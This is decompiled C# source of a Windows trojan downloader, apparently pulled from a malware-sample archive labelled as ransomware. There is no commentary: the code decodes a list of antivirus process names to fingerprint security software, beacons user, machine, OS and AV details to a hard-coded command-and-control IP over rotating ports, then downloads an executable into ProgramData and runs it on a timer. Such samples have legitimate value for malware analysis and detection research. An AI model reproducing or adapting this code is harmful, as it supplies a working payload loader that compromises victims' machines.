// Decompiled with JetBrains decompiler
// Type: atlgrahrsa.MRIMN
// Assembly: atlgrahrsa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7EC66E4-B34C-4C73-968C-0808A7ECF513
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Agent.gen-02a9b5170a41455e0649a63de42331cbf995c5a65b50a3235df75c443cd525db.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace atlgrahrsa
{
  internal class MRIMN
  {
    private SROVC StateObj = new SROVC();
    public bool atlgrahrsaiswitch = false;
    private int atlgrahrsabytRead = 0;
    private NetworkStream atlgrahrsadatStream;
    public static byte[] encAvs = new byte[220]
    {
      (byte) 98,
      (byte) 100,
      (byte) 115,
      (byte) 115,
      (byte) 61,
      (byte) 66,
      (byte) 105,
      (byte) 116,
      (byte) 32,
      (byte) 68,
      (byte) 101,
      (byte) 102,
      (byte) 101,
      (byte) 110,
      (byte) 100,
      (byte) 101,
      (byte) 114,
      (byte) 44,
      (byte) 111,
      (byte) 110,
      (byte) 108,
      (byte) 105,
      (byte) 110,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 81,
      (byte) 72,
      (byte) 101,
      (byte) 97,
      (byte) 108,
      (byte) 44,
      (byte) 98,
      (byte) 100,
      (byte) 97,
      (byte) 103,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 66,
      (byte) 105,
      (byte) 116,
      (byte) 32,
      (byte) 68,
      (byte) 101,
      (byte) 102,
      (byte) 101,
      (byte) 110,
      (byte) 100,
      (byte) 101,
      (byte) 114,
      (byte) 32,
      (byte) 65,
      (byte) 103,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 44,
      (byte) 109,
      (byte) 115,
      (byte) 115,
      (byte) 101,
      (byte) 99,
      (byte) 101,
      (byte) 115,
      (byte) 61,
      (byte) 77,
      (byte) 83,
      (byte) 32,
      (byte) 69,
      (byte) 115,
      (byte) 115,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 105,
      (byte) 97,
      (byte) 108,
      (byte) 115,
      (byte) 44,
      (byte) 102,
      (byte) 115,
      (byte) 115,
      (byte) 109,
      (byte) 51,
      (byte) 50,
      (byte) 61,
      (byte) 70,
      (byte) 83,
      (byte) 101,
      (byte) 99,
      (byte) 117,
      (byte) 114,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 112,
      (byte) 61,
      (byte) 75,
      (byte) 97,
      (byte) 115,
      (byte) 112,
      (byte) 101,
      (byte) 114,
      (byte) 115,
      (byte) 107,
      (byte) 121,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 105,
      (byte) 114,
      (byte) 97,
      (byte) 44,
      (byte) 115,
      (byte) 112,
      (byte) 98,
      (byte) 98,
      (byte) 99,
      (byte) 115,
      (byte) 118,
      (byte) 99,
      (byte) 61,
      (byte) 83,
      (byte) 121,
      (byte) 109,
      (byte) 97,
      (byte) 110,
      (byte) 116,
      (byte) 101,
      (byte) 99,
      (byte) 44,
      (byte) 117,
      (byte) 112,
      (byte) 100,
      (byte) 97,
      (byte) 116,
      (byte) 101,
      (byte) 114,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 77,
      (byte) 99,
      (byte) 65,
      (byte) 102,
      (byte) 101,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 65,
      (byte) 86,
      (byte) 71,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 99,
      (byte) 99,
      (byte) 61,
      (byte) 65,
      (byte) 86,
      (byte) 71,
      (byte) 44,
      (byte) 109,
      (byte) 98,
      (byte) 97,
      (byte) 109,
      (byte) 61,
      (byte) 65,
      (byte) 110,
      (byte) 116,
      (byte) 32,
      (byte) 77,
      (byte) 97,
      (byte) 108,
      (byte) 119,
      (byte) 97,
      (byte) 114,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116
    };
    public TcpClient atlgrahrsasysSCK;
    public string ips = "5.189.134.216|nvidashd".Split('|')[0];
    public static int port = 5156;
    public static int aport = 7218;
    public static int bport = 9686;
    public static int cport = 12538;
    public static int dport = 16468;
    public bool isconnected = false;
    public int sysPort = 5156;
    public string appPath = "\\Adrwas\\|atlgrahrsa".Split('|')[0];
    public int port_sn = 0;
    private int atlgrahrsabufSize = 1024;
    private string atlgrahrsaavs = "";
    public string mainApp = "rmtiurwa|atlgrahrsa".Split('|')[0];
    public string excPath;

    public string zuissloadAV()
    {
      string str = "";
      try
      {
        Process[] processes = Process.GetProcesses();
        string[] strArray1 = Encoding.UTF8.GetString(MRIMN.encAvs, 0, MRIMN.encAvs.Length).Split(',');
        for (int index1 = 0; index1 < processes.Length; ++index1)
        {
          string lower = processes[index1].ProcessName.ToLower();
          if (lower.Length > 4)
          {
            for (int index2 = 0; index2 < strArray1.Length; ++index2)
            {
              if (strArray1[index2].Contains(lower))
              {
                string[] strArray2 = strArray1[index2].Split('=');
                str = str + " " + strArray2[1].Trim();
              }
            }
          }
        }
        return str;
      }
      catch
      {
        return "";
      }
    }

    public void atlgrahrsaports_switch()
    {
      ++this.port_sn;
      switch (this.port_sn)
      {
        case 0:
          this.sysPort = MRIMN.port;
          break;
        case 1:
          this.sysPort = MRIMN.aport;
          break;
        case 2:
          this.sysPort = MRIMN.bport;
          break;
        case 3:
          this.sysPort = MRIMN.cport;
          break;
        case 4:
          this.sysPort = MRIMN.dport;
          break;
      }
      if (this.port_sn < 4)
        return;
      this.port_sn = 0;
    }

    public string atlgrahrsaget_commend()
    {
      try
      {
        this.atlgrahrsamore_data("doadez=xldok | " + Environment.UserName + "   |   " + Environment.MachineName + "   |   " + this.atlgrahrsaOsname() + " | " + this.atlgrahrsaavs + " | " + Path.GetFileNameWithoutExtension(Application.ExecutablePath));
        byte[] buffer = new byte[5];
        this.atlgrahrsabytRead = this.atlgrahrsadatStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.atlgrahrsabytRead)
        {
          int count = index > this.atlgrahrsabufSize ? this.atlgrahrsabufSize : index;
          this.atlgrahrsabytRead = this.atlgrahrsadatStream.Read(numArray, offset, count);
          offset += this.atlgrahrsabytRead;
        }
        return Encoding.UTF8.GetString(numArray, 0, int32).ToString();
      }
      catch
      {
        return (string) null;
      }
    }

    public void atlgrahrsaservData(object StateObj) => this.atlgrahrsaresponce();

    public string atlgrahrsaget_mpath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + this.appPath;

    private bool atlgrahrsamore_data(string type)
    {
      try
      {
        byte[] bytes1 = Encoding.UTF8.GetBytes(type);
        int num1 = 0;
        int num2 = 5;
        byte[] bytes2 = BitConverter.GetBytes(bytes1.Length);
        byte[] buffer = new byte[num2 + bytes1.Length + (num1 - 1) + 1];
        bytes2.CopyTo((Array) buffer, 0);
        bytes1.CopyTo((Array) buffer, 5);
        int offset = 0;
        int count;
        for (int length = buffer.Length; length > 0; length -= count)
        {
          count = length > this.atlgrahrsabufSize ? this.atlgrahrsabufSize : length;
          this.atlgrahrsadatStream.Write(buffer, offset, count);
          offset += count;
        }
        return true;
      }
      catch
      {
        return false;
      }
    }

    public bool atlgrahrsaconnetc()
    {
      try
      {
        if (!this.isconnected)
        {
          this.atlgrahrsasysSCK = new TcpClient();
          this.atlgrahrsasysSCK.Connect(this.ips, this.sysPort);
          this.atlgrahrsabufSize = this.atlgrahrsasysSCK.ReceiveBufferSize;
          this.atlgrahrsadatStream = this.atlgrahrsasysSCK.GetStream();
          this.isconnected = true;
        }
        return true;
      }
      catch
      {
        this.atlgrahrsaports_switch();
        this.atlgrahrsaiswitch = false;
        this.isconnected = false;
        return false;
      }
    }

    public void atlgrahrsaresponce()
    {
      try
      {
        if (this.atlgrahrsaiswitch || !this.atlgrahrsaconnetc() || !this.iyatxuwais_need())
          return;
        this.atlgrahrsaiswitch = true;
        string[] strArray1 = this.atlgrahrsaget_commend().Split('=');
        string lower = strArray1[0].ToLower();
        if (lower.Split('-').Length > 1)
          lower = lower.Split('-')[1];
        switch ("atlgrahrsa" + lower)
        {
          case "atlgrahrsainfo":
            this.atlgrahrsaiswitch = false;
            this.atlgrahrsaresponce();
            break;
          case "atlgrahrsadoadez":
            try
            {
              string[] strArray2 = strArray1[1].Split('|');
              if (strArray2.Length > 1)
              {
                this.mainApp = strArray2[0];
                this.appPath = strArray2[1];
              }
            }
            catch
            {
            }
            try
            {
              if (!Directory.Exists(this.atlgrahrsaget_mpath()))
                Directory.CreateDirectory(this.atlgrahrsaget_mpath());
              byte[] bytes = this.atlgrahrsahaveData();
              if (bytes != null)
              {
                int num = 1;
                while (true)
                {
                  if (File.Exists(this.atlgrahrsaget_mpath() + this.mainApp + ".exe!atlgrahrsa".Split('!')[0]))
                  {
                    this.mainApp += num.ToString();
                    ++num;
                  }
                  else
                    break;
                }
                File.WriteAllBytes(this.atlgrahrsaget_mpath() + this.mainApp + ".exe!atlgrahrsa".Split('!')[0], bytes);
                Thread.Sleep(140);
                new Process()
                {
                  StartInfo = {
                    FileName = (this.atlgrahrsaget_mpath() + this.mainApp + ".exe!atlgrahrsa".Split('!')[0])
                  }
                }.Start();
                break;
              }
              break;
            }
            catch
            {
              break;
            }
        }
        this.atlgrahrsaiswitch = false;
      }
      catch
      {
        this.isconnected = false;
        this.atlgrahrsaiswitch = false;
      }
    }

    public string atlgrahrsaOsname()
    {
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!atlgrahrsa".Split('!')[0]);
        if (registryKey != null)
        {
          string str = registryKey.GetValue("ProductName!atlgrahrsa".Split('!')[0]).ToString().Trim();
          if (str != null)
            return str;
        }
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!atlgrahrsa".Split('!')[0];
      }
    }

    private byte[] atlgrahrsahaveData()
    {
      try
      {
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.atlgrahrsabytRead = this.atlgrahrsadatStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        for (int index = int32; index > 0; index -= this.atlgrahrsabytRead)
        {
          int count = index > this.atlgrahrsabufSize ? this.atlgrahrsabufSize : index;
          this.atlgrahrsabytRead = this.atlgrahrsadatStream.Read(buffer2, offset, count);
          offset += this.atlgrahrsabytRead;
        }
        return buffer2;
      }
      catch
      {
        return (byte[]) null;
      }
    }

    public bool iyatxuwais_need() => !File.Exists(this.atlgrahrsaget_mpath() + this.mainApp + ".exe") || Process.GetProcessesByName(this.mainApp).Length == 0;

    public void atlgrahrsaloadstart()
    {
      try
      {
        this.atlgrahrsaavs = this.zuissloadAV();
        this.StateObj.timer = new System.Threading.Timer(new TimerCallback(this.atlgrahrsaservData), (object) this.StateObj, 23010, 61500);
      }
      catch
      {
      }
    }
  }
}
